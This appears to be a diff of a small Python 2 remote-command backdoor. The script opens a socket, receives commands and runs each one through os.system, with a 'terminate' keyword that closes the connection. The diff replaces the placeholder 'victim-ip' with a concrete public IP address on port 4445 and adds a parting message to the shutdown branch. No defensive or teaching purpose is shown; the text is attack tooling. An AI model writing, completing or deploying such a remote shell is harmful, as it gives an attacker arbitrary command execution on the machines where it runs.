@@ -16,7 +16,7 @@ import socket
 import os
 import sys
 
-ip = "victim-ip"
+ip = "142.93.112.220"
 port = 4445
 
 server =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -34,10 +34,8 @@ while True:
 	if not data:
 		print "command cannot be blank my friend"
 	elif data.strip() == "terminate":
+		client.sendall("bye buddy")
 		client.close()
 		sys.exit(0)
 	else:
 		os.system(data)
-	
-	
-	
